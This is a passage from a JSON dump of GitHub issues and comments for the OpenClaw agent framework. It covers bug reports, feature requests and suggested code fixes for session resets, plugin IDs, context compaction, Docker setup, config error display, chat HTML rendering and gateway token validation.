          "author": "0xRaini",
          "body": "I've run into this exact issue with topic-based setups. Your root cause analysis is right — the reset flow clears delivery context before capturing the topicId.\n\nLooking at the code, the fix should be in the Telegram channel's command handler. Specifically, the `reset`/`new` command processing needs to:\n\n```ts\n// Before reset, capture the current delivery context\nconst { topicId, chatId } = extractTopicContext(msg);\n\n// After session reset/creation\nnewSession.deliveryContext.topicId = topicId;\n```\n\nThe tricky part is that `reset` might go through a generic command handler that doesn't know about Telegram-specific fields. So the topicId preservation might need to happen at the channel adapter level (before the generic reset), not in the core session logic.\n\nI can look into submitting a fix if no one's working on this yet."
        }
      ]
    },
    {
      "number": 10484,
      "title": "[Bug] Duplicate plugin ID warning in feishu extension",
      "body": "**Description**:\n\n启动 OpenClaw 时出现警告：\n```\nConfig warnings: - plugins.entries.feishu: plugin feishu: duplicate plugin id detected; later plugin may be overridden (/Users/fengzhihao.infeng/.nvm/versions/node/v24.13.0/lib/node_modules/openclaw/extensions/feishu/index.ts)\n```\n\n**Root Cause**:\n\n在 `extensions/feishu/index.ts` 和 `extensions/feishu/src/channel.ts` 中都定义了相同的 `id: \"feishu\"`：\n\n`index.ts`:\n```typescript\nconst plugin = {\n  id: \"feishu\",\n  ...\n};\n```\n\n`channel.ts`:\n```typescript\nexport const feishuPlugin: ChannelPlugin<ResolvedFeishuAccount> = {\n  id: \"feishu\",  // ← 重复\n  meta: {...},\n  ...\n};\n```\n\n**Expected Behavior**:\n不应有重复的插件 ID 警告。\n\n**Suggested Fix**:\n移除 `channel.ts` 中的 `id: \"feishu\"` 字段，因为 `index.ts` 已经是主入口文件负责导出插件 ID。\n\n**Affected Version**:\n- OpenClaw 版本: 2026.2.3-1\n- Node: v24.13.0\n- macOS: Darwin 25.2.0 (arm64)",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/10484",
      "createdAt": "2026-02-06T15:23:35Z",
      "updatedAt": "2026-02-11T09:43:45Z",
      "author": "infeng",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3874895399,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10484#issuecomment-3874895399",
          "createdAt": "2026-02-10T02:02:45Z",
          "updatedAt": "2026-02-10T02:02:45Z",
          "author": "sparkmao",
          "body": "Still exist on 2026.2.9 version"
        },
        {
          "id": 3877275392,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10484#issuecomment-3877275392",
          "createdAt": "2026-02-10T12:24:18Z",
          "updatedAt": "2026-02-10T12:24:18Z",
          "author": "YangWang0514",
          "body": "移除了字段还是有"
        },
        {
          "id": 3883325980,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10484#issuecomment-3883325980",
          "createdAt": "2026-02-11T09:43:45Z",
          "updatedAt": "2026-02-11T09:43:45Z",
          "author": "AmnesiaBeing",
          "body": "我使用\n```\nopenclaw plugins enable feishu\n```\n就解决了，原因估计是，自带的extensions文件夹里面已经有feishu了，然后如果用install，还会在工作目录的extensions目录下再装一个飞书的插件，所以报重复了"
        }
      ]
    },
    {
      "number": 10073,
      "title": "[Feature] Configurable compaction threshold (agents.defaults.compaction.threshold)",
      "body": "## Problem\n\nThe current `compaction.mode: \"safeguard\"` triggers too late. By the time compaction activates (near the model's max context), agents often crash before recovery can happen.\n\n**Real-world failure case:**\n```\nLLM request rejected: input length and max_tokens exceed context limit: 180692 + 34048 > 200000\n```\n\nThe agent hit 180k tokens with no way to save state or compact. Session died.\n\n## Proposed Solution\n\nAdd a configurable threshold to trigger compaction proactively:\n\n```json\n{\n  \"agents\": {\n    \"defaults\": {\n      \"compaction\": {\n        \"mode\": \"safeguard\",\n        \"threshold\": 100000\n      }\n    }\n  }\n}\n```\n\nWhen context reaches `threshold` tokens:\n1. Trigger compaction automatically\n2. Summarize older messages\n3. Continue session seamlessly\n\n## Why This Helps\n\n- **Prevents crashes**: Compact at 100k instead of crashing at 180k\n- **User control**: Different use cases need different thresholds\n- **Simple fix**: Just a config option + threshold check in the compaction logic\n\n## Current Workaround\n\nWe're using behavioral rules in agent config files:\n```\nTurn 10: Save progress to memory file\nTurn 15: STOP. Request new session.\n```\n\nThis works but relies on agent discipline. A technical enforcement would be more reliable.\n\n## Related Issues\n- #7052 - Auto-summarize before limit (broader proposal)\n- #5357 - Safeguard fails when >20% over limit\n- #9079 - Auto-compaction on context limit errors\n\nThis issue is specifically requesting the **config option** to control when compaction triggers.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/10073",
      "createdAt": "2026-02-06T03:12:12Z",
      "updatedAt": "2026-02-11T09:38:36Z",
      "author": "lobsec-security",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3857734418,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10073#issuecomment-3857734418",
          "createdAt": "2026-02-06T03:24:33Z",
          "updatedAt": "2026-02-06T03:24:33Z",
          "author": "lobsec-security",
          "body": "## Update: This is already possible!\n\nAfter digging through the code, I found that `reserveTokensFloor` already does this:\n\n```bash\nopenclaw config set agents.defaults.compaction.reserveTokensFloor 100000\n```\n\nThe compaction logic in pi-coding-agent triggers when:\n```\ncontextTokens > contextWindow - reserveTokens\n```\n\nSo setting `reserveTokensFloor: 100000` on a 200k model means compaction at 100k tokens.\n\n### Documentation Request\n\nThe feature exists but isn't well documented. The request changes to:\n\n1. **Better naming or alias** - `reserveTokensFloor` doesn't clearly communicate \"compact at X tokens\"\n2. **Documentation** - Add to docs explaining this is how to control compaction threshold\n3. **Optional: `threshold` alias** - Allow `compaction.threshold: 100000` as a more intuitive alternative\n\nFor now, users can use:\n```json\n{\n  \"agents\": {\n    \"defaults\": {\n      \"compaction\": {\n        \"mode\": \"safeguard\",\n        \"reserveTokensFloor\": 100000\n      }\n    }\n  }\n}\n```"
        },
        {
          "id": 3883300067,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10073#issuecomment-3883300067",
          "createdAt": "2026-02-11T09:38:36Z",
          "updatedAt": "2026-02-11T09:38:36Z",
          "author": "MikeMcGarry",
          "body": "I'm having similar issues where I want to limit my max context window to 20k to keep costs down. Having trouble triggering auto compaction with this lower limit. "
        }
      ]
    },
    {
      "number": 14012,
      "title": "[Bug]: ./docker-setup.sh stop in \"Onboarding complete\", does not progress.",
      "body": "./docker-setup.sh stop in \"Onboarding complete\", does not progress.\n\n\n## Summary\n\n./docker-setup.sh stop in \"Onboarding complete\", does not progress.\n\n## Steps to reproduce\n\nVery new install Ubuntu 24.04 server\n\nInstall docker from docker official https://download.docker.com/linux/ubuntu .\n\ngit clone OpenClaw, checkout tag v2026.2.9\n\nrun ./docker-setup.sh\n\n## Expected behavior\n\nAfter \"Onboarding complete\", the terminal should ask me use Web or TUI. (v2026.2.6-3 behavior, not tested in v2026.2.9).\n\n## Actual behavior\n\nAfter \"Onboarding complete\", just hang.\nNot exit.  Gateway not started.\n\nLeave the ./docker-setup.sh hang, run docker ps in other bash:\n\n```\ncrazyclaw@crazyclaw2602:~/openclaw/openclaw$ docker ps\nCONTAINER ID   IMAGE            COMMAND                  CREATED         STATUS         PORTS     NAMES\ndb708930c989   openclaw:local   \"node dist/index.js …\"   6 minutes ago   Up 6 minutes             openclaw-openclaw-cli-run-11dc0f91f9aa\n```\n\n## Environment\n\n- Clawdbot version: v2026.2.9 (33c75cb6bf2dde53131f33a1ea4995e1aa8d550e)\n- OS: Ubuntu server 24.04\n- Install method (pnpm/npx/docker/etc): docker\n\n## Logs or screenshots\n\n./docker-setup.sh hang this ways:\n\n```\n\n◇  Enable hooks?\n│  Skip for now\n│\n◇  Systemd ───────────────────────────────────────────────────────────────────────────────╮\n│                                                                                         │\n│  Systemd user services are unavailable. Skipping lingering checks and service install.  │\n│                                                                                         │\n├─────────────────────────────────────────────────────────────────────────────────────────╯\n│\n◇\nHealth check failed: gateway closed (1006 abnormal closure (no close frame)): no close reason\n  Gateway target: ws://127.0.0.1:18789\n  Source: local loopback\n  Config: /home/node/.openclaw/openclaw.json\n  Bind: loopback\n│\n◇  Health check help ────────────────────────────────╮\n│                                                    │\n│  Docs:                                             │\n│  https://docs.openclaw.ai/gateway/health           │\n│  https://docs.openclaw.ai/gateway/troubleshooting  │\n│                                                    │\n├────────────────────────────────────────────────────╯\n│\n◇  Optional apps ────────────────────────╮\n│                                        │\n│  Add nodes for extra features:         │\n│  - macOS app (system + notifications)  │\n│  - iOS app (camera/canvas)             │\n│  - Android app (camera/canvas)         │\n│                                        │\n├────────────────────────────────────────╯\n│\n◇  Control UI ───────────────────────────────────────────────────────────────────────────────╮\n│                                                                                            │\n│  Web UI: http://127.0.0.1:18789/                                                           │\n│  Web UI (with token):                                                                      │\n│  http://127.0.0.1:18789/#token=xxx            │\n│  Gateway WS: ws://127.0.0.1:18789                                                          │\n│  Gateway: not detected (gateway closed (1006 abnormal closure (no close frame)): no close  │\n│  reason)                                                                                   │\n│  Docs: https://docs.openclaw.ai/web/control-ui                                             │\n│                                                                                            │\n├────────────────────────────────────────────────────────────────────────────────────────────╯\n│\n◇  Workspace backup ────────────────────────────────────────╮\n│                                                           │\n│  Back up your agent workspace.                            │\n│  Docs: https://docs.openclaw.ai/concepts/agent-workspace  │\n│                                                           │\n├───────────────────────────────────────────────────────────╯\n│\n◇  Security ──────────────────────────────────────────────────────╮\n│                                                                 │\n│  Running agents on your computer is risky — harden your setup:  │\n│  https://docs.openclaw.ai/security                              │\n│                                                                 │\n├─────────────────────────────────────────────────────────────────╯\n│\n◇  Shell completion ───────────────────────────────────────────────────────╮\n│                                                                          │\n│  Shell completion installed. Restart your shell or run: source ~/.zshrc  │\n│                                                                          │\n├──────────────────────────────────────────────────────────────────────────╯\n│\n◇  Dashboard ready ────────────────────────────────────────────────────────────────╮\n│                                                                                  │\n│  Dashboard link (with token):                                                    │\n│  http://127.0.0.1:18789/#token=xxx  │\n│  Copy/paste this URL in a browser on this machine to control OpenClaw.           │\n│  No GUI detected. Open from your computer:                                       │\n│  ssh -N -L 18789:127.0.0.1:18789 user@<host>                                     │\n│  Then open:                                                                      │\n│  http://localhost:18789/                                                         │\n│  http://localhost:18789/#token=xxx  │\n│  Docs:                                                                           │\n│  https://docs.openclaw.ai/gateway/remote                                         │\n│  https://docs.openclaw.ai/web/control-ui                                         │\n│                                                                                  │\n├──────────────────────────────────────────────────────────────────────────────────╯\n│\n◇  Web search (optional) ─────────────────────────────────────────────────────────────────╮\n│                                                                                         │\n│  If you want your agent to be able to search the web, you’ll need an API key.           │\n│                                                                                         │\n│  OpenClaw uses Brave Search for the `web_search` tool. Without a Brave Search API key,  │\n│  web search won’t work.                                                                 │\n│                                                                                         │\n│  Set it up interactively:                                                               │\n│  - Run: openclaw configure --section web                                                │\n│  - Enable web_search and paste your Brave Search API key                                │\n│                                                                                         │\n│  Alternative: set BRAVE_API_KEY in the Gateway environment (no config changes).         │\n│  Docs: https://docs.openclaw.ai/tools/web                                               │\n│                                                                                         │\n├─────────────────────────────────────────────────────────────────────────────────────────╯\n│\n◇  What now ─────────────────────────────────────────────────────────────╮\n│                                                                        │\n│  What now: https://openclaw.ai/showcase (\"What People Are Building\").  │\n│                                                                        │\n├────────────────────────────────────────────────────────────────────────╯\n│\n└  Onboarding complete. Use the dashboard link above to control OpenClaw.\n\n# ./docker-setup.sh hang here\n\n```\n\nsome debug run in other bash\n\n```\ncrazyclaw@crazyclaw2602:~/openclaw/openclaw$ git rev-parse HEAD\n33c75cb6bf2dde53131f33a1ea4995e1aa8d550e\n\ncrazyclaw@crazyclaw2602:~/openclaw/openclaw$ docker ps\nCONTAINER ID   IMAGE            COMMAND                  CREATED         STATUS         PORTS     NAMES\ndb708930c989   openclaw:local   \"node dist/index.js …\"   6 minutes ago   Up 6 minutes             openclaw-openclaw-cli-run-11dc0f91f9aa\n\ncrazyclaw@crazyclaw2602:~/openclaw/openclaw$ docker compose run --rm openclaw-cli --version\nWARN[0000] The \"CLAUDE_AI_SESSION_KEY\" variable is not set. Defaulting to a blank string.\nWARN[0000] The \"CLAUDE_WEB_SESSION_KEY\" variable is not set. Defaulting to a blank string.\nWARN[0000] The \"CLAUDE_WEB_COOKIE\" variable is not set. Defaulting to a blank string.\nWARN[0000] The \"CLAUDE_AI_SESSION_KEY\" variable is not set. Defaulting to a blank string.\nWARN[0000] The \"CLAUDE_WEB_SESSION_KEY\" variable is not set. Defaulting to a blank string.\nWARN[0000] The \"CLAUDE_WEB_COOKIE\" variable is not set. Defaulting to a blank string.\nContainer openclaw-openclaw-cli-run-54ad4c108976 Creating\nContainer openclaw-openclaw-cli-run-54ad4c108976 Created\n2026.2.9\n\ncrazyclaw@crazyclaw2602:~/openclaw/openclaw$ docker compose version\nDocker Compose version v5.0.2\n```\n\nrelated chat:\nhttps://discord.com/channels/1456350064065904867/1459642797895319552/threads/1470946426820493323",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14012",
      "createdAt": "2026-02-11T09:31:59Z",
      "updatedAt": "2026-02-11T09:33:39Z",
      "author": "luzi82",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "macos",
          "linux",
          "docker"
        ],
        "components": [
          "gateway",
          "web-ui",
          "tui",
          "onboarding",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3883276927,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14012#issuecomment-3883276927",
          "createdAt": "2026-02-11T09:33:39Z",
          "updatedAt": "2026-02-11T09:33:39Z",
          "author": "luzi82",
          "body": "docker version for debug.\n\n```\ncrazyclaw@crazyclaw2602:~$ docker version\nClient: Docker Engine - Community\n Version:           29.2.1\n API version:       1.53\n Go version:        go1.25.6\n Git commit:        a5c7197\n Built:             Mon Feb  2 17:17:26 2026\n OS/Arch:           linux/amd64\n Context:           default\n\nServer: Docker Engine - Community\n Engine:\n  Version:          29.2.1\n  API version:      1.53 (minimum version 1.44)\n  Go version:       go1.25.6\n  Git commit:       6bc6209\n  Built:            Mon Feb  2 17:17:26 2026\n  OS/Arch:          linux/amd64\n  Experimental:     false\n containerd:\n  Version:          v2.2.1\n  GitCommit:        dea7da592f5d1d2b7755e3a161be07f43fad8f75\n runc:\n  Version:          1.3.4\n  GitCommit:        v1.3.4-0-gd6d73eb8\n docker-init:\n  Version:          0.19.0\n  GitCommit:        de40ad0\n```\n"
        }
      ]
    },
    {
      "number": 13959,
      "title": "Control UI: preserve structured config validation errors instead of opaque [object Object]",
      "body": "## Summary\nWhen saving config from the Control UI, users can still get opaque errors like `[object Object]` instead of actionable validation details.\n\nA common real-world trigger is editing `channels.qq` values (e.g., admin/blocked QQ IDs) while another part of the full config has a type issue (for example `models.providers.*.models[].maxTokens`).\n\n## Why this is problematic\n- The UI currently collapses structured gateway errors into unreadable strings.\n- Users cannot see failing paths/messages directly, so they think QQ fields are broken while the actual error is elsewhere.\n- This makes `/config` troubleshooting unnecessarily hard.\n\n## Reproduction\n1. Open `/config` in Control UI (form mode).\n2. Ensure one unrelated field is invalid in full config (e.g. a model `maxTokens` becomes a string/NaN).\n3. Change a `channels.qq` field and click Save.\n4. Observe error text in UI.\n\n## Actual\nError can appear as generic/opaque text (`[object Object]` in some paths), hiding JSON details like failing `path` + `message`.\n\n## Expected\nUI should always preserve structured error details from gateway responses, so users can immediately see which field/path failed validation.\n\n## Proposed fix\n- In `ui/src/ui/gateway.ts`, include `error.details` in the rejected `Error` message (JSON-serialized when object/array).\n- In `ui/src/ui/controllers/config.ts`, avoid `String(err)` fallback for object errors; JSON-serialize unknown non-`Error` values.\n- Add focused tests to lock behavior.\n\nI'll open a PR with this fix and link it here.\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13959",
      "createdAt": "2026-02-11T08:09:45Z",
      "updatedAt": "2026-02-11T09:25:50Z",
      "author": "constansino",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "web-ui",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882933005,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13959#issuecomment-3882933005",
          "createdAt": "2026-02-11T08:10:11Z",
          "updatedAt": "2026-02-11T08:10:11Z",
          "author": "constansino",
          "body": "Linked PR: https://github.com/openclaw/openclaw/pull/13960"
        },
        {
          "id": 3883240304,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13959#issuecomment-3883240304",
          "createdAt": "2026-02-11T09:25:50Z",
          "updatedAt": "2026-02-11T09:25:50Z",
          "author": "constansino",
          "body": "Root-cause fix PR (redaction scope): https://github.com/openclaw/openclaw/pull/14006"
        }
      ]
    },
    {
      "number": 14008,
      "title": "[Feature]: add wecom(企业微信) channel extension",
      "body": "## Background\n\nWeCom (企业微信) is Tencent's enterprise communication and collaboration platform, widely adopted across Chinese businesses and organizations. Adding WeCom support would greatly expand OpenClaw's reach to Chinese enterprise users who rely on WeCom for daily communication and collaboration.\n\n## We Have a Production-Ready Implementation\n\nWe already have a mature, production-tested implementation available, co-built with Tencent Cloud contributors.\n\nRepository: https://github.com/yanhaidao/wecom\n\n## Features\n\nThe implementation adopts a unique **Bot + Agent dual-mode architecture**:\n\n- Bot + Agent dual-mode parallel architecture with \"Bot-first, Agent-fallback\" strategy\n- Native streaming responses (typing effect) via Bot channel\n- Full multi-modal support: receive text, image, voice, video, file; send text, image, Markdown, file\n- 6-minute timeout relay: auto-switch from Bot stream to Agent DM for long-running tasks\n- Group chat file fallback: Bot notifies in group, Agent delivers file via DM\n- Agent proactive messaging: push to users, departments (Party), tags (Tag)\n- Cronjob integration for scheduled broadcasts (`openclaw cron`)\n- AccessToken auto-management with caching, pre-refresh, and retry\n- XML encryption/decryption for secure callback handling\n- Interactive onboarding flow for bot configuration\n- Egress proxy support for dynamic IP / NAT environments\n- Allowlist-based DM security with configurable policy\n- Dynamic Agent routing: per-user/group isolated Agent instances\n- OpenClaw command support (/new, /compact, /models, etc.)\n- Media upload/download pipeline (default 25MB limit, configurable)\n\n## Next Steps\n\nI would like to contribute this implementation to the official OpenClaw repository. Before submitting a PR, I wanted to start this discussion to:\n\n1. Confirm community interest in this feature\n2. Get feedback on the implementation approach\n3. Discuss any concerns or requirements from maintainers\n\nLooking forward to your thoughts!",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14008",
      "createdAt": "2026-02-11T09:25:45Z",
      "updatedAt": "2026-02-11T09:25:45Z",
      "author": "xl370869-art",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "onboarding",
          "config"
        ]
      }
    },
    {
      "number": 14002,
      "title": "Web chat renders raw HTML from agent responses as formatted content",
      "body": "## Summary\n\nWhen an agent response or user message contains raw HTML (e.g., pasted error pages, HTML snippets), the web chat UI renders it as formatted HTML rather than displaying it as text.\n\nThe markdown renderer (`ui/src/ui/markdown.ts`) passes text through `marked.parse()` which preserves raw HTML blocks, and while DOMPurify strips dangerous elements (`<script>`, `<iframe>`), allowed tags like `<h1>`, `<p>`, `<table>`, `<br>` still render as formatted HTML.\n\n## Example\n\nPasting this into chat:\n```html\n<h1>Error response</h1>\n<p>Error code: 404</p>\n<p>Message: File not found.</p>\n```\n\nRenders as a large heading and formatted paragraphs instead of showing the raw markup.\n\n## Security Note\n\nThis is **not an XSS vulnerability** — DOMPurify correctly strips scripts, event handlers, and dangerous elements. The issue is purely a UX/rendering problem where HTML appears as formatted content when users expect to see literal text.\n\n## Suggested Fix\n\nOverride marked's `html` renderer to escape raw HTML blocks:\n```ts\nconst renderer = new marked.Renderer();\nrenderer.html = ({ text }) => escapeHtml(text);\n```\n\n## Related\n\n- #13937 (user report)\n- PR #13952 (fix submitted)\n\n## Environment\n\nAll platforms, web chat UI.",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14002",
      "createdAt": "2026-02-11T09:20:57Z",
      "updatedAt": "2026-02-11T09:22:42Z",
      "author": "0xRaini",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3883225491,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14002#issuecomment-3883225491",
          "createdAt": "2026-02-11T09:22:41Z",
          "updatedAt": "2026-02-11T09:22:41Z",
          "author": "0xRaini",
          "body": "Closing — this duplicates context already covered in the linked PR. Apologies for the noise."
        }
      ]
    },
    {
      "number": 14001,
      "title": "normalizeGatewayTokenInput does not reject weak/sentinel token values",
      "body": "## Summary\n\n`normalizeGatewayTokenInput()` in `src/commands/onboard-helpers.ts` only trims whitespace but does not reject weak or sentinel values like `\"undefined\"`, `\"null\"`, `\"test\"`, `\"token\"`, or single-character strings.\n\n```ts\nexport function normalizeGatewayTokenInput(value: unknown): string {\n  if (typeof value !== 'string') return '';\n  return value.trim();  // accepts 'undefined', 'null', 'a', etc.\n}\n```\n\n## Impact\n\nIf a user accidentally enters one of these values (or if the configure wizard passes through a stringified `undefined`), the gateway runs with a trivially guessable token — a security risk.\n\n## Suggested Fix\n\n```ts\nexport function normalizeGatewayTokenInput(value: unknown): string {\n  if (typeof value !== 'string') return '';\n  const trimmed = value.trim();\n  // Reject sentinel strings that indicate programming errors\n  if (['undefined', 'null', 'true', 'false', ''].includes(trimmed.toLowerCase())) {\n    return '';\n  }\n  // Reject very short tokens (< 8 chars) as likely mistakes\n  if (trimmed.length > 0 && trimmed.length < 8) {\n    return '';\n  }\n  return trimmed;\n}\n```\n\n## Environment\n\nAll platforms, all versions.",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14001",
      "createdAt": "2026-02-11T09:20:40Z",
      "updatedAt": "2026-02-11T09:22:39Z",
      "author": "0xRaini",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "onboarding",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3883225266,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14001#issuecomment-3883225266",
          "createdAt": "2026-02-11T09:22:38Z",
          "updatedAt": "2026-02-11T09:22:38Z",
          "author": "0xRaini",
          "body": "Closing — this duplicates context already covered in the linked PR. Apologies for the noise."
        }
      ]
    },
    {
      "number": 13999,
      "title": "buildGatewayAuthConfig silently accepts undefined token/password values",
      "body": "## Summary\n\n`buildGatewayAuthConfig()` in `src/commands/configure.gateway-auth.ts` does not validate that `token` or `password` values are defined when the corresponding mode is selected. If `params.token` is `undefined`, the config object is written with `token: undefined`, which `JSON.stringify` serializes as the literal string `\"undefined\"`.\n\n## Root Cause\n\n```ts\nif (params.mode === \"token\") {\n  return { ...base, mode: \"token\", token: params.token }; // no guard\n}\n```\n\nWhile the primary caller in `configure.gateway.ts` has a fallback (`normalizeGatewayTokenInput(tokenInput) || randomToken()`), other callers (e.g., `doctor.ts`) may not have the same protection.\n\n## Impact\n\n- Gateway runs with a known token (`\"undefined\"`) — security risk\n- Auth fallback chain picks up the truthy string, preventing randomToken generation\n- Related to #13756\n\n## Suggested Fix\n\nAdd runtime validation in `buildGatewayAuthConfig`:\n```ts\nif (params.mode === \"token\") {\n  if (!params.token || params.token === \"undefined\") {\n    throw new Error(\"Gateway token must be a non-empty string\");\n  }\n  return { ...base, mode: \"token\", token: params.token };\n}\n```\n\n## Related\n\n- #13756 (user report)\n- PR #13766 (fix submitted)",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13999",
      "createdAt": "2026-02-11T09:20:09Z",
      "updatedAt": "2026-02-11T09:22:36Z",
      "author": "0xRaini",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3883225016,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13999#issuecomment-3883225016",
          "createdAt": "2026-02-11T09:22:35Z",
          "updatedAt": "2026-02-11T09:22:35Z",
          "author": "0xRaini",
          "body": "Closing — this duplicates context already covered in the linked PR. Apologies for the noise."
        }
      ]
    },
    {
      "number": 13998,
      "title": "sanitizeToolUseResultPairing not re-run after limitHistoryTurns truncation",
      "body": "## Summary\n\nThe session preparation pipeline runs `sanitizeSessionHistory()` (which calls `repairToolUseResultPairing()`) **before** `limitHistoryTurns()`. When `limitHistoryTurns()` then slices the history by user-turn count, it can remove an assistant message containing a `tool_use` block while keeping the corresponding `tool_result` in a later user message — re-introducing orphaned tool results.\n\nThis causes Anthropic API to reject with:\n```\nHTTP 400: messages.N.content.1: unexpected tool_use_id found in tool_result blocks\n```\n\n## Affected Code Paths\n\n1. **Main reply flow** (`src/agents/pi-embedded-runner/run/attempt.ts`)\n2. **Compaction flow** (`src/agents/pi-embedded-runner/compact.ts`)\n\nBoth follow the pattern:\n```ts\nconst sanitized = await sanitizeSessionHistory(...); // repairs pairing\nconst limited = limitHistoryTurns(sanitized, limit); // can re-orphan\nsession.agent.replaceMessages(limited); // orphans sent to API\n```\n\n## Suggested Fix\n\nRe-run `sanitizeToolUseResultPairing()` after `limitHistoryTurns()`:\n```ts\nconst truncated = limitHistoryTurns(sanitized, limit);\nconst limited = policy.repairToolUseResultPairing\n  ? sanitizeToolUseResultPairing(truncated)\n  : truncated;\n```\n\n## Related\n\n- #13896 (user report)\n- PR #13926 (fix submitted)\n\n## Reproduction\n\n- Long-running DM session with tool use\n- `dmHistoryLimit` configured\n- Conversation grows long enough for truncation to hit a tool_use/tool_result boundary",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13998",
      "createdAt": "2026-02-11T09:19:56Z",
      "updatedAt": "2026-02-11T09:22:33Z",
      "author": "0xRaini",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3883224795,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13998#issuecomment-3883224795",
          "createdAt": "2026-02-11T09:22:32Z",
          "updatedAt": "2026-02-11T09:22:32Z",
          "author": "0xRaini",
          "body": "Closing — this duplicates context already covered in the linked PR. Apologies for the noise."
        }
      ]
    },
    {
      "number": 13995,
      "title": "resolveCommand() on Windows appends .cmd but spawn still needs shell: true",
      "body": "## Summary\n\n`resolveCommand()` in `src/process/exec.ts` correctly appends `.cmd` to npm/pnpm/yarn on Windows, but `runCommandWithTimeout()` does not pass `shell: true` to `spawn()`. On newer Node versions (v24+), spawning `.cmd` files without `shell: true` throws `EINVAL`.\n\n## Related\n\n- #13936 (same root cause, reported by user)\n- PR #13985 (fix submitted)\n\n## Impact\n\nAll `runCommandWithTimeout` calls with npm/pnpm/yarn fail on Windows:\n- `openclaw plugins install`\n- `openclaw plugins update`\n- Any plugin dependency installation\n\n## Environment\n\nWindows 10/11, Node v24+",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13995",
      "createdAt": "2026-02-11T09:19:38Z",
      "updatedAt": "2026-02-11T09:22:29Z",
      "author": "0xRaini",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3883224551,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13995#issuecomment-3883224551",
          "createdAt": "2026-02-11T09:22:28Z",
          "updatedAt": "2026-02-11T09:22:28Z",
          "author": "0xRaini",
          "body": "Closing — this duplicates context already covered in the linked PR. Apologies for the noise."
        }
      ]
    },
    {
      "number": 14004,
      "title": "Compaction flow does not re-validate Anthropic turn ordering after limitHistoryTurns",
      "body": "## Summary\n\nIn the compaction flow (`src/agents/pi-embedded-runner/compact.ts`), the pipeline runs:\n\n1. `sanitizeSessionHistory()` — sanitizes tool calls, repairs pairing\n2. `validateGeminiTurns()` — validates turn ordering for Gemini\n3. `validateAnthropicTurns()` — validates turn ordering for Anthropic\n4. `limitHistoryTurns()` — truncates by user-turn count\n\nStep 4 can break the turn ordering that was validated in steps 2-3. For example, truncation could remove an assistant message, leaving two consecutive user messages — which Anthropic rejects.\n\nThe main reply flow in `run/attempt.ts` has the same pattern.\n\n## Impact\n\n- Intermittent HTTP 400 errors from Anthropic: `messages: roles must alternate`\n- Only affects sessions with both tool use AND history limits configured\n- Difficult to reproduce because it depends on truncation boundary\n\n## Suggested Fix\n\nMove validation steps after `limitHistoryTurns()`, or re-validate after truncation:\n\n```ts\nconst truncated = limitHistoryTurns(validated, limit);\nconst revalidated = transcriptPolicy.validateAnthropicTurns\n  ? validateAnthropicTurns(truncated) : truncated;\n```\n\n## Environment\n\nAll platforms, Anthropic provider.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14004",
      "createdAt": "2026-02-11T09:21:44Z",
      "updatedAt": "2026-02-11T09:21:44Z",
      "author": "0xRaini",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13997,
      "title": "[Bug]:    Gateway hangs on Claude 3.5 Sonnet (no response via Control UI or CLI agent)",
